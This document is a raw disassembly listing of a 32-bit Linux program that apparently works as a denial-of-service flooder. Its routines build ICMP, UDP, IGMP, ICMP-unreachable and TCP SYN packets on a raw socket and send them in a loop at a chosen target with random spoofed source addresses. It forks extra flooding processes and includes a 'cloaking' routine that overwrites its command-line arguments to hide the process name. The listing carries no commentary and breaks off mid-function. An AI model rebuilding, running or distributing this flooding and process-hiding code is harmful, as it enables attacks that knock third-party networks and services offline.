xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._2
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
cmp dword [obj.completed.3], 0
jne 0x804885c
jmp 0x8048835
mov esi, esi
lea edx, [eax + 4]
mov dword [obj.p.2], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.2]
cmp dword [eax], 0
jne 0x8048828
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048852
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.3], 1
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x8048883
push obj.object.8
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x80499a8
mov esi, esi
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x804999c
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
dec ebx
test ebx, ebx
jge 0x8048b74
jmp 0x8048ba8
mov esi, esi
lea eax, [ebx*4]
mov edx, dword [dest]
mov eax, dword [edx + eax]
push eax
call sym.imp.strlen
add esp, 4
mov eax, eax
push eax
push 0
lea eax, [ebx*4]
mov edx, dword [dest]
mov eax, dword [edx + eax]
push eax
call sym.imp.memset
add esp, 0xc
dec ebx
jmp 0x8048b6c
mov eax, dword [obj.stealth]
push eax
mov eax, dword [dest]
mov edx, dword [eax]
push edx
call sym.imp.strcpy
add esp, 8
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.strlen]
jmp dword [reloc.memset]
jmp dword [reloc.strcpy]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
push eax
push str.e_1_36m
push str.e_1_35m
push str.e_0_0He_J
push str._s_sUSAGE:__s_s__destination__You_messed_it_up__n
call sym.imp.printf
add esp, 0x14
push 0
call sym.imp.exit
jmp dword [reloc.printf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
mov ecx, dword [obj.uminsize]
add ecx, 0x1c
mov dword [obj.ICMP_Size], ecx
mov eax, dword [obj.ICMP_Size]
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.ICMP_Packet], eax
mov eax, dword [obj.ICMP_Packet]
mov dword [obj.ICMP_IP_HDR], eax
mov ecx, dword [obj.ICMP_Packet]
add ecx, 0x14
mov dword [obj.ICMP_HDR], ecx
mov eax, dword [obj.ICMP_Size]
push eax
push 0
mov eax, dword [obj.ICMP_Packet]
push eax
call sym.imp.memset
add esp, 0xc
mov ecx, dword [obj.uminsize]
add ecx, 0x1c
mov dword [obj.UDP_Size], ecx
mov eax, dword [obj.UDP_Size]
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.UDP_Packet], eax
mov eax, dword [obj.UDP_Packet]
mov dword [obj.UDP_IP_HDR], eax
mov ecx, dword [obj.UDP_Packet]
add ecx, 0x14
mov dword [obj.UDP_HDR], ecx
mov eax, dword [obj.UDP_Size]
push eax
push 0
mov eax, dword [obj.UDP_Packet]
push eax
call sym.imp.memset
add esp, 0xc
mov ecx, dword [obj.uminsize]
add ecx, 0x1c
mov dword [obj.IGMP_Size], ecx
mov eax, dword [obj.IGMP_Size]
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.IGMP_Packet], eax
mov eax, dword [obj.IGMP_Packet]
mov dword [obj.IGMP_IP_HDR], eax
mov ecx, dword [obj.IGMP_Packet]
add ecx, 0x14
mov dword [obj.IGMP_HDR], ecx
mov eax, dword [obj.IGMP_Size]
push eax
push 0
mov eax, dword [obj.IGMP_Packet]
push eax
call sym.imp.memset
add esp, 0xc
mov ecx, dword [obj.uminsize]
add ecx, 0x1c
mov dword [obj.UNREACH_Size], ecx
mov eax, dword [obj.UNREACH_Size]
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.UNREACH_Packet], eax
mov eax, dword [obj.UNREACH_Packet]
mov dword [obj.UNREACH_IP_HDR], eax
mov ecx, dword [obj.UNREACH_Packet]
add ecx, 0x14
mov dword [obj.UNREACH_ICMP_HDR], ecx
mov eax, dword [obj.UNREACH_Size]
push eax
push 0
mov eax, dword [obj.UNREACH_Packet]
push eax
call sym.imp.memset
add esp, 0xc
mov ecx, dword [obj.eminsize]
add ecx, 0x28
mov dword [obj.SYN_Size], ecx
mov eax, dword [obj.SYN_Size]
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.SYN_Packet], eax
mov eax, dword [obj.SYN_Packet]
mov dword [obj.SYN_IP_HDR], eax
mov ecx, dword [obj.SYN_Packet]
add ecx, 0x14
mov dword [obj.SYN_TCP_HDR], ecx
mov eax, dword [obj.SYN_Size]
push eax
push 0
mov eax, dword [obj.SYN_Packet]
push eax
call sym.imp.memset
add esp, 0xc
mov eax, dword [obj.ICMP_IP_HDR]
mov edx, dword [obj.dst]
mov dword [eax + 0x10], edx
mov eax, dword [obj.ICMP_IP_HDR]
and byte [eax], 0xf
or byte [eax], 0x40
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.ICMP_IP_HDR]
mov word [edx + 6], ax
mov eax, dword [obj.ICMP_IP_HDR]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [obj.ICMP_IP_HDR]
mov byte [eax + 8], 0xff
mov eax, dword [obj.ICMP_IP_HDR]
mov byte [eax + 9], 1
push 0xe0
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.ICMP_IP_HDR]
mov byte [edx + 1], al
movzx eax, word [obj.ICMP_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.ICMP_IP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.ICMP_IP_HDR]
mov word [eax + 0xa], 0
mov eax, dword [obj.ICMP_HDR]
mov byte [eax + 1], 0
mov ax, word [obj.ICMP_Size]
mov dx, word [obj.eminsize]
add eax, edx
movzx edx, ax
push edx
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.ICMP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.SYN_IP_HDR]
mov edx, dword [obj.dst]
mov dword [eax + 0x10], edx
mov eax, dword [obj.SYN_IP_HDR]
and byte [eax], 0xf
or byte [eax], 0x40
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.SYN_IP_HDR]
mov word [edx + 6], ax
mov eax, dword [obj.SYN_IP_HDR]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [obj.SYN_IP_HDR]
mov byte [eax + 8], 0xff
mov eax, dword [obj.SYN_IP_HDR]
mov byte [eax + 9], 6
push 0xe0
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.SYN_IP_HDR]
mov byte [edx + 1], al
movzx eax, word [obj.SYN_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.SYN_IP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.SYN_IP_HDR]
mov word [eax + 0xa], 0
mov eax, dword [obj.SYN_TCP_HDR]
mov byte [eax + 0xd], 2
push 0xffff
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.SYN_TCP_HDR]
mov word [edx + 0xe], ax
movzx eax, word [obj.SYN_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.SYN_TCP_HDR]
mov word [edx + 0x10], ax
mov eax, dword [obj.IGMP_IP_HDR]
mov edx, dword [obj.dst]
mov dword [eax + 0x10], edx
mov eax, dword [obj.IGMP_IP_HDR]
and byte [eax], 0xf
or byte [eax], 0x40
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.IGMP_IP_HDR]
mov word [edx + 6], ax
mov eax, dword [obj.IGMP_IP_HDR]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [obj.IGMP_IP_HDR]
mov byte [eax + 8], 0xff
mov eax, dword [obj.IGMP_IP_HDR]
mov byte [eax + 9], 2
push 0xe0
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.IGMP_IP_HDR]
mov byte [edx + 1], al
movzx eax, word [obj.IGMP_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.IGMP_IP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.IGMP_IP_HDR]
mov word [eax + 0xa], 0
mov eax, dword [obj.IGMP_HDR]
mov byte [eax], 0x11
mov eax, dword [obj.IGMP_HDR]
mov byte [eax + 1], 0
movzx eax, word [obj.IGMP_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.IGMP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.UNREACH_IP_HDR]
mov edx, dword [obj.dst]
mov dword [eax + 0x10], edx
mov eax, dword [obj.UNREACH_IP_HDR]
and byte [eax], 0xf
or byte [eax], 0x40
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UNREACH_IP_HDR]
mov word [edx + 6], ax
mov eax, dword [obj.UNREACH_IP_HDR]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [obj.UNREACH_IP_HDR]
mov byte [eax + 8], 0xff
mov eax, dword [obj.UNREACH_IP_HDR]
mov byte [eax + 9], 1
push 0xe0
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UNREACH_IP_HDR]
mov byte [edx + 1], al
movzx eax, word [obj.UNREACH_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UNREACH_IP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.UNREACH_IP_HDR]
mov word [eax + 0xa], 0
mov eax, dword [obj.UNREACH_ICMP_HDR]
mov byte [eax], 3
mov ax, word [obj.UNREACH_Size]
mov dx, word [obj.uminsize]
add eax, edx
movzx edx, ax
push edx
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UNREACH_ICMP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.UDP_IP_HDR]
mov edx, dword [obj.dst]
mov dword [eax + 0x10], edx
mov eax, dword [obj.UDP_IP_HDR]
and byte [eax], 0xf
or byte [eax], 0x40
push 0x2000
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UDP_IP_HDR]
mov word [edx + 6], ax
mov eax, dword [obj.UDP_IP_HDR]
and byte [eax], 0xf0
or byte [eax], 5
mov eax, dword [obj.UDP_IP_HDR]
mov byte [eax + 8], 0xff
mov eax, dword [obj.UDP_IP_HDR]
mov byte [eax + 9], 0x11
push 0xe0
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UDP_IP_HDR]
mov byte [edx + 1], al
movzx eax, word [obj.UDP_Size]
push eax
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UDP_IP_HDR]
mov word [edx + 2], ax
mov eax, dword [obj.UDP_IP_HDR]
mov word [eax + 0xa], 0
push 8
call sym.imp.htons
add esp, 4
mov eax, eax
mov edx, dword [obj.UDP_HDR]
mov word [edx + 4], ax
xor eax, eax
jmp 0x8049110
leave
ret
jmp dword [reloc.malloc]
jmp dword [reloc.htons]
push ebp
mov ebp, esp
push ebx
call 0x804862d
pop ebx
add ebx, 0x2707
cmp dword [ebx + 0x70], 0
je 0x8048642
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 4
nop
nop
push str.x:n:f:
mov eax, dword [argv]
push eax
mov eax, dword [argc]
push eax
call sym.imp.getopt
add esp, 0xc
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0xffffffff
jne 0x80489c8
jmp 0x8048a60
lea esi, [esi]
mov eax, dword [var_4h]
cmp eax, 0x6e
je 0x8048a1c
cmp eax, 0x6e
jg 0x80489dc
cmp eax, 0x66
je 0x8048a34
jmp 0x8048a4c
cmp eax, 0x78
je 0x80489e4
jmp 0x8048a4c
nop
mov eax, dword [obj.optarg]
push eax
call sym.imp.strlen
add esp, 4
mov eax, eax
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.stealth], eax
mov eax, dword [obj.optarg]
push eax
mov eax, dword [obj.stealth]
push eax
call sym.imp.strcpy
add esp, 8
jmp 0x8048a5a
mov esi, esi
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov dword [obj.numpacks], eax
jmp 0x8048a5a
nop
mov eax, dword [obj.optarg]
push eax
call sym.imp.atoi
add esp, 4
mov eax, eax
mov dword [obj.forknum], eax
jmp 0x8048a5a
nop
mov eax, dword [argv]
mov edx, dword [eax]
push edx
call sym.usage
add esp, 4
jmp 0x80489a0
nop
cmp dword [obj.stealth], 0
jne 0x8048a73
mov dword [obj.stealth], 0x8049a93
cmp dword [obj.forknum], 0
jne 0x8048a86
mov dword [obj.forknum], 0
mov eax, dword [obj.optind]
lea edx, [eax*4]
mov eax, dword [argv]
cmp dword [eax + edx], 0
jne 0x8048acc
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._n_n_s__s_s__s_We_need_a_Place_for_the_Packets_to_Go_s_n
call sym.imp.printf
add esp, 0x18
push 1
call sym.imp.exit
add esp, 4
nop
mov eax, dword [obj.optind]
lea edx, [eax*4]
mov eax, dword [argv]
mov edx, dword [eax + edx]
push edx
call sym.imp.strlen
add esp, 4
mov eax, eax
push eax
call sym.imp.malloc
add esp, 4
mov eax, eax
mov dword [obj.target], eax
cmp dword [obj.target], 0
jne 0x8048b40
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._n_n_s__s_s__s_Unable_to_Allocate_Required_Amount_of_Memory_for_Task_s_n
call sym.imp.printf
add esp, 0x18
push str.malloc
call sym.imp.perror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
nop
mov eax, dword [obj.optind]
lea edx, [eax*4]
mov eax, dword [argv]
mov edx, dword [eax + edx]
push edx
mov eax, dword [obj.target]
push eax
call sym.imp.strcpy
add esp, 8
leave
ret
push ebp
mov ebp, esp
push str.e_1_33m
push str.e_0_0He_J
push str._s_sBlizzard_Kicks_Ass...
call sym.imp.printf
add esp, 0xc
leave
ret
push ebp
mov ebp, esp
sub esp, 0x2c
push edi
push esi
push ebx
xor edi, edi
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0xc
mov dword [var_28h], eax
mov eax, dword [var_28h]
mov dword [obj.opensock], eax
cmp dword [obj.opensock], 0
jge 0x804915c
push str.socket
call sym.imp.perror
add esp, 4
push 1
call sym.imp.exit
add esp, 4
nop
call sym.imp.getgid
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.setgid
add esp, 4
call sym.imp.getuid
mov dword [var_28h], eax
mov eax, dword [var_28h]
push eax
call sym.imp.setuid
add esp, 4
cmp dword [argv], 1
jg 0x80491a4
mov edx, dword [envp]
mov dword [var_28h], edx
mov eax, dword [var_28h]
mov eax, dword [eax]
mov dword [var_2ch], eax
mov edx, dword [var_2ch]
push edx
call sym.usage
add esp, 4
mov eax, dword [envp]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
mov eax, dword [argv]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.parse_args
add esp, 8
mov eax, dword [envp]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
mov eax, dword [argv]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.cloaking
add esp, 8
call sym.resolvedest
cmp dword [obj.forknum], 0
je 0x804933c
call sym.imp.fork
mov dword [var_28h], eax
cmp dword [var_28h], 0xffffffff
je 0x8049204
cmp dword [var_28h], 0
je 0x804925c
jmp 0x8049264
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._s____s_s__s_Your_OS_cant_Make_the_fork___call_as_we_need_it_s
call sym.imp.printf
add esp, 0x18
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._s____s_s__s_This_is_usually_an_indication_of_something_bad_s
call sym.imp.printf
add esp, 0x18
push 1
call sym.imp.exit
add esp, 4
mov esi, esi
jmp 0x804933c
lea esi, [esi]
dec dword [obj.forknum]
xor ebx, ebx
cmp ebx, dword [obj.forknum]
jl 0x804927c
jmp 0x804933c
lea esi, [esi]
call sym.imp.fork
mov dword [var_28h], eax
cmp dword [var_28h], 0xffffffff
je 0x8049294
cmp dword [var_28h], 0
je 0x80492ec
jmp 0x80492f4
mov esi, esi
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._s____s_s__s_Unable_to_fork_s_n
call sym.imp.printf
add esp, 0x18
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._s____s_s__s_This_is_usually_an_indication_of_something_bad_s
call sym.imp.printf
add esp, 0x18
push 1
call sym.imp.exit
add esp, 4
mov esi, esi
mov ebx, dword [obj.forknum]
jmp 0x8049334
mov eax, dword [obj.forknum]
dec eax
mov dword [var_28h], eax
cmp ebx, dword [var_28h]
jne 0x8049334
push str.e_0_0m
push str.e_0_31m
push str.e_0_36m
push str.e_1_37m
push str.e_0_36m
push str._s____s_s__s__Process_Backgrounded_s_n
call sym.imp.printf
add esp, 0x18
push 0
call sym.imp.exit
add esp, 4
mov esi, esi
inc ebx
jmp 0x804926c
mov esi, esi
cmp dword [obj.numpacks], 0
jne 0x804934c
inc edi
inc dword [obj.numpacks]
call sym.Setup_Packets
call loc.gcc2_compiled._3
xor esi, esi
cmp esi, dword [obj.numpacks]
jl 0x8049368
jmp 0x8049980
lea esi, [esi]
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.htonl
add esp, 4
mov dword [var_28h], eax
mov eax, dword [obj.ICMP_IP_HDR]
mov dword [var_2ch], eax
mov eax, dword [var_28h]
mov edx, dword [var_2ch]
mov dword [edx + 0xc], eax
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [obj.ICMP_IP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax + 4], dx
call sym.imp.rand
mov dword [var_2ch], eax
mov eax, dword [obj.ICMP_HDR]
mov dword [var_28h], eax
mov dword [var_8h], 0x66666667
mov eax, dword [var_8h]
imul dword [var_2ch]
mov ecx, edx
mov eax, ecx
sar eax, 2
mov dword [var_ch], eax
mov ecx, dword [var_2ch]
sar ecx, 0x1f
mov edx, dword [var_ch]
sub edx, ecx
mov dword [var_4h], edx
mov ecx, dword [var_4h]
shl ecx, 2
add ecx, dword [var_4h]
lea eax, [ecx*2]
mov dword [var_10h], eax
mov edx, dword [var_2ch]
sub edx, dword [var_10h]
mov dword [var_2ch], edx
mov eax, dword [var_2ch]
lea ecx, [eax*4]
mov dword [var_2ch], obj.etype
mov edx, dword [var_2ch]
mov cl, byte [ecx + edx]
mov eax, dword [var_28h]
mov byte [eax], cl
push 0x10
mov dword [var_28h], obj.dstaddr
mov edx, dword [var_28h]
push edx
push 0
mov eax, dword [obj.ICMP_Size]
mov dword [var_28h], eax
mov edx, dword [obj.eminsize]
mov dword [var_2ch], edx
mov eax, dword [var_28h]
add eax, dword [var_2ch]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
mov eax, dword [obj.ICMP_Packet]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
mov eax, dword [obj.opensock]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.sendto
add esp, 0x18
call sym.imp.rand
mov dword [var_28h], eax
mov eax, dword [var_28h]
push eax
call sym.imp.htonl
add esp, 4
mov dword [var_28h], eax
mov edx, dword [obj.IGMP_IP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov dword [eax + 0xc], edx
call sym.imp.rand
mov dword [var_28h], eax
mov eax, dword [obj.IGMP_IP_HDR]
mov dword [var_2ch], eax
mov eax, dword [var_28h]
mov edx, dword [var_2ch]
mov word [edx + 4], ax
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.htonl
add esp, 4
mov dword [var_28h], eax
mov eax, dword [obj.IGMP_HDR]
mov dword [var_2ch], eax
mov eax, dword [var_28h]
mov edx, dword [var_2ch]
mov dword [edx + 4], eax
push 0x1c
call sym.imp.htons
add esp, 4
mov word [var_28h], ax
mov edx, dword [obj.IGMP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax + 2], dx
push 0x10
mov dword [var_28h], obj.dstaddr
mov eax, dword [var_28h]
push eax
push 0
mov edx, dword [obj.IGMP_Size]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
mov edx, dword [obj.IGMP_Packet]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
mov edx, dword [obj.opensock]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.sendto
add esp, 0x18
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.htonl
add esp, 4
mov dword [var_28h], eax
mov eax, dword [obj.SYN_IP_HDR]
mov dword [var_2ch], eax
mov eax, dword [var_28h]
mov edx, dword [var_2ch]
mov dword [edx + 0xc], eax
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [obj.SYN_IP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax + 4], dx
push 0x4839
call sym.imp.htons
add esp, 4
mov word [var_28h], ax
mov eax, dword [obj.SYN_TCP_HDR]
mov dword [var_2ch], eax
movzx edx, word [var_28h]
mov dword [var_28h], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov dword [eax + 4], edx
mov eax, dword [obj.SYN_TCP_HDR]
mov dword [var_28h], eax
mov edx, dword [var_28h]
mov dword [edx + 8], 0
call sym.imp.rand
mov dword [var_28h], eax
mov ecx, 0x68db8bad
mov eax, dword [var_28h]
imul ecx
mov dword [var_2ch], edx
mov ecx, dword [var_2ch]
sar ecx, 0xc
mov eax, dword [var_28h]
sar eax, 0x1f
mov dword [var_2ch], eax
sub ecx, dword [var_2ch]
mov dword [var_14h], ecx
mov edx, dword [var_14h]
shl edx, 5
mov dword [var_2ch], edx
sub dword [var_2ch], ecx
shl dword [var_2ch], 2
add dword [var_2ch], ecx
mov eax, dword [var_2ch]
lea ecx, [eax*4]
add dword [var_2ch], ecx
mov ecx, dword [var_2ch]
shl ecx, 4
mov edx, dword [var_28h]
sub edx, ecx
mov dword [var_28h], edx
mov eax, dword [var_28h]
inc eax
mov word [var_2ch], ax
movzx edx, word [var_2ch]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.htons
add esp, 4
mov word [var_28h], ax
mov edx, dword [obj.SYN_TCP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax + 2], dx
call sym.imp.rand
mov dword [var_28h], eax
mov ecx, 0x68db8bad
mov eax, dword [var_28h]
imul ecx
mov dword [var_2ch], edx
mov ecx, dword [var_2ch]
sar ecx, 0xc
mov eax, dword [var_28h]
sar eax, 0x1f
mov dword [var_2ch], eax
sub ecx, dword [var_2ch]
mov dword [var_18h], ecx
mov edx, dword [var_18h]
shl edx, 5
mov dword [var_2ch], edx
sub dword [var_2ch], ecx
shl dword [var_2ch], 2
add dword [var_2ch], ecx
mov eax, dword [var_2ch]
lea ecx, [eax*4]
add dword [var_2ch], ecx
mov ecx, dword [var_2ch]
shl ecx, 4
mov edx, dword [var_28h]
sub edx, ecx
mov dword [var_28h], edx
mov eax, dword [var_28h]
inc eax
mov word [var_2ch], ax
movzx edx, word [var_2ch]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.htons
add esp, 4
mov word [var_28h], ax
mov edx, dword [obj.SYN_TCP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax], dx
push 0x10
mov dword [var_28h], obj.dstaddr
mov eax, dword [var_28h]
push eax
push 0
mov edx, dword [obj.SYN_Size]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
mov edx, dword [obj.SYN_Packet]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
mov edx, dword [obj.opensock]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.sendto
add esp, 0x18
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.htonl
add esp, 4
mov dword [var_28h], eax
mov eax, dword [obj.UNREACH_IP_HDR]
mov dword [var_2ch], eax
mov eax, dword [var_28h]
mov edx, dword [var_2ch]
mov dword [edx + 0xc], eax
call sym.imp.rand
mov dword [var_28h], eax
mov edx, dword [obj.UNREACH_IP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax + 4], dx
call sym.imp.rand
mov dword [var_2ch], eax
mov eax, dword [obj.ICMP_HDR]
mov dword [var_28h], eax
mov ecx, dword [var_2ch]
test ecx, ecx
jge 0x804975b
add ecx, 0xf
sar ecx, 4
mov dword [var_1ch], ecx
mov ecx, dword [var_1ch]
shl ecx, 4
mov edx, dword [var_2ch]
sub edx, ecx
mov dword [var_2ch], edx
mov eax, dword [var_2ch]
lea ecx, [eax*4]
mov dword [var_2ch], obj.ucode
mov edx, dword [var_2ch]
mov cl, byte [ecx + edx]
mov eax, dword [var_28h]
mov byte [eax + 1], cl
push 0x10
mov dword [var_28h], obj.dstaddr
mov edx, dword [var_28h]
push edx
push 0
mov eax, dword [obj.UNREACH_Size]
mov dword [var_28h], eax
mov edx, dword [obj.uminsize]
mov dword [var_2ch], edx
mov eax, dword [var_28h]
add eax, dword [var_2ch]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
mov eax, dword [obj.UNREACH_Packet]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
mov eax, dword [obj.opensock]
mov dword [var_28h], eax
mov edx, dword [var_28h]
push edx
call sym.imp.sendto
add esp, 0x18
call sym.imp.rand
mov dword [var_28h], eax
mov eax, dword [var_28h]
push eax
call sym.imp.htonl
add esp, 4
mov dword [var_28h], eax
mov edx, dword [obj.UDP_IP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov dword [eax + 0xc], edx
call sym.imp.rand
mov dword [var_28h], eax
mov eax, dword [obj.UDP_IP_HDR]
mov dword [var_2ch], eax
mov eax, dword [var_28h]
mov edx, dword [var_2ch]
mov word [edx + 4], ax
call sym.imp.rand
mov dword [var_28h], eax
mov ecx, 0x68db8bad
mov eax, dword [var_28h]
imul ecx
mov dword [var_2ch], edx
mov ecx, dword [var_2ch]
sar ecx, 0xc
mov eax, dword [var_28h]
sar eax, 0x1f
mov dword [var_2ch], eax
sub ecx, dword [var_2ch]
mov dword [var_20h], ecx
mov edx, dword [var_20h]
shl edx, 5
mov dword [var_2ch], edx
sub dword [var_2ch], ecx
shl dword [var_2ch], 2
add dword [var_2ch], ecx
mov eax, dword [var_2ch]
lea ecx, [eax*4]
add dword [var_2ch], ecx
mov ecx, dword [var_2ch]
shl ecx, 4
mov edx, dword [var_28h]
sub edx, ecx
mov dword [var_28h], edx
mov eax, dword [var_28h]
inc eax
mov word [var_2ch], ax
movzx edx, word [var_2ch]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.htons
add esp, 4
mov word [var_28h], ax
mov edx, dword [obj.UDP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax], dx
call sym.imp.rand
mov dword [var_28h], eax
mov ecx, 0x68db8bad
mov eax, dword [var_28h]
imul ecx
mov dword [var_2ch], edx
mov ecx, dword [var_2ch]
sar ecx, 0xc
mov eax, dword [var_28h]
sar eax, 0x1f
mov dword [var_2ch], eax
sub ecx, dword [var_2ch]
mov dword [var_24h], ecx
mov edx, dword [var_24h]
shl edx, 5
mov dword [var_2ch], edx
sub dword [var_2ch], ecx
shl dword [var_2ch], 2
add dword [var_2ch], ecx
mov eax, dword [var_2ch]
lea ecx, [eax*4]
add dword [var_2ch], ecx
mov ecx, dword [var_2ch]
shl ecx, 4
mov edx, dword [var_28h]
sub edx, ecx
mov dword [var_28h], edx
mov eax, dword [var_28h]
inc eax
mov word [var_2ch], ax
movzx edx, word [var_2ch]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.htons
add esp, 4
mov word [var_28h], ax
mov edx, dword [obj.UDP_HDR]
mov dword [var_2ch], edx
mov edx, dword [var_28h]
mov eax, dword [var_2ch]
mov word [eax + 2], dx
push 0x10
mov dword [var_28h], obj.dstaddr
mov eax, dword [var_28h]
push eax
push 0
mov edx, dword [obj.UDP_Size]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
mov edx, dword [obj.UDP_Packet]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
